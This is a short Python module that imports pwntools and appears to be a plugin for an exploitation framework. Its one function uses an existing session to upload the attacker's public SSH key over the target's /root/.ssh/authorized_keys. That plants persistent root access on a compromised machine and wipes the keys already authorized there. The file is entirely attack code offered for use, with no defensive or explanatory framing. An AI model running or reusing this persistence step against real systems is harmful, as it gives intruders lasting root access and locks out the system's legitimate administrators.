#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):

    session.upload_file("/root/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys")
    return 0
